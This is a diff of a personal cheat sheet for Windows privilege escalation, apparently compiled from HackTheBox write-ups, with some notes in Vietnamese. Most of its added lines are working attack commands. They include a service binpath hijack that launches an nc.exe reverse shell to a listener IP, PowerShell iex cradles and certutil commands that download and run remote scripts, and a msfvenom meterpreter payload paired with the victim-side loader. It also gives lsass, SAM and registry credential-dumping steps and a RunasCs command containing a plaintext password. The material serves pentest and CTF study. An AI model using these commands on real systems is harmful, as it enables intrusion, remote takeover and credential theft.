@@ -1,21 +1,95 @@
 https://github.com/Ignitetechnologies/Windows-Privilege-Escalation?fbclid=IwAR0-vuV1hd0Z7ySNhevg_6hIRVsyF2_0PaEWeFC94qxleB0Qe0oHCfRPCvU
+lib
+binary từ file
+kernal
+NTLM
+can write \windows\system32   -> https://0xdf.gitlab.io/2020/02/01/htb-re.html#path-2-zipslip
+https://0xdf.gitlab.io/2019/05/04/htb-bighead.html#coffee
+reg query HKLM /f password /t REG_SZ /s   #search passwd
 
+https://0xdf.gitlab.io/2020/02/01/htb-re.html#shell-as-coby-administrator
+.\accesschk -accepteula -uvwc *
+NT AUTHORITY\SERVICE
+accesschk.exe "<Account-name>" C:\Windows -wus    #find the folder can write
+accesschk.exe -ucqv <service name>  #check action user use service
+icacls <file/folder name>   #show permission
+sc.exe qc <service name>   #check info of service
+RX - nghĩa là bất kỳ người dùng nào trên hệ thống sẽ có cả quyền đọc và thực thi trong thư mục
+sc.exe config <name_service> binpath="C:\users\public\downloads\nc.exe 10.10.16.3 53 -e cmd.exe"
+sc.exe start <name_service>
+cipher /c <filename> #show who can decrypt file
+
+where <command>
+echo %path%
+gci -force  #show the hidden file
+powershell -enc [base64-string] #run command as base64
+whoami /priv
+whoami /all
+https://hackmd.io/@CP04042K/SyBeBluis#Surface-scanning---Internal-reconnaissance
+net user => xem tất cả user tồn tại trên hệ thống
+net group => xem tất cả các groups tồn tại trên hệ thống
+wmic useraccount list full => xem toàn bộ thông tin của tất cả các user trên hệ thống 
+#download
+certutil.exe -urlcache -f http://<ip>/file <des_file>
+https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#kerberos---udp-and-tcp-88
+#dump who logon this computer
+reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
+---------------------------------------------------------tool priv
+https://github.com/51x/WHP
+
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+python2 windows-exploit-suggester.py --database 2023-10-21-mssb.xls --systeminfo info.txt
+https://github.com/SecWiki/windows-kernel-exploits  
+MS10-059
+MS15-051
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"   #check .NET version installed on system
+winPeas >4.0 .NET
+https://0xdf.gitlab.io/2019/03/05/htb-devel.html#privesc-alternative-with-metasploit  #priv with metasploit
+/----------------------------------------------------------------------/
+https://0xdf.gitlab.io/2018/10/27/htb-bounty.html
+#-----------------exploit kernal to be root
+https://github.com/decoder-it/juicy-potato
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+whoami /priv
+--> SeImpersonatePrivilege or SeAssignPrimaryToken
+https://viblo.asia/p/leo-thang-dac-quyen-thong-qua-windows-access-token-GrLZDo8gKk0#_22-bien-dich-va-chay-ma-4
+
+#-----------------identify some kernel exploits
+https://github.com/rasta-mouse/Sherlock
+iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
+Find-AllVulns
+#Another way to install and exec
+https://0xdf.gitlab.io/2022/04/11/htb-tally.html#identify-firefox-exploit
+powershell -c iex(iwr('http://10.10.14.6/0xdf.ps1'))
+
+#----------------metasploit
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=445 -f psh -o www/met-445.ps1
+victim:  iex(new-object net.webclient).downloadstring('http://10.10.14.5/met-445.ps1')
+use post/multi/recon/local_exploit_suggester
+/----------------------------------------------------------------------/
+---------------------------------------------------------------shedule
+https://0xdf.gitlab.io/2020/03/21/htb-forest.html#shell
+schtasks /query /fo TABLE   #find cronjob
+schtasks /query /tn <cronjob name> /v /fo list   #show info of cronjob
+-------------------------------------------------------------------------user
 https://quantrimang.com/cong-nghe/dieu-khien-dac-quyen-tai-khoan-administrator-35640
 Get-LocalUser
 Get-LocalGroupMember -Name administrators
+passwd -d user   # để bỏ pass
 
 net user aarti 123 /add
 net user <username>  #see info of user
 sudo ruby evil-winrm.rb -i 192.168.1.2 -u Admin -H "<Hash>"
+evil-winrm -i <IP> -u <domain>\\<username> -H <Hash>
+
+change user https://0xdf.gitlab.io/2023/05/06/htb-flight.html#shell-as-cbum
+https://github.com/antonioCoco/RunasCs/releases
+powershell -c wget 10.10.14.4/RunasCs.exe -outfile r.exe
+.\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.6:443 cmd
 
 Local Group Policy Editor -> Computer Config -> Windows Setting -> Security -> Local -> User -> Allow log on locally
-#---------------set account permission
-lusrmgr.msc
-
-whoami /priv
-getuid
-#-------------------------privilege escalation
-#-----------------------------------save file ve dump user
+#----------------------------------------------------------------save file ve dump user
 gpedit.msc
 
 https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
@@ -27,8 +101,22 @@ cd Temp
 download sam
 download system
 pypykatz registry --sam sam system
+MagnusKatz(another like pypykatz and mimikatz)
+
+https://0xdf.gitlab.io/2019/09/07/htb-bastion.html#privesc-to-administrator
+https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
+file SAM  and system    #registry hives
+mRemoteNG  is a remote connection management tool, and it allows the user to save passwords for various types of connections
+
+https://hackmd.io/@CP04042K/SyBeBluis#Command-and-Control-CampC-Frameworks
+net use Z: https://live.sysinternals.com
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+pypykatz lsa lsass.dmp
 
 https://helich0pper.github.io/blackfield/
 lsass.dmp  --> mimikatz
+https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/
 #-------------------------------------------msf to download file and privilege
 https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
+--------------------------------------Document Filtering  yara rule
+https://0xdf.gitlab.io/2020/02/01/htb-re.html#beyond-root
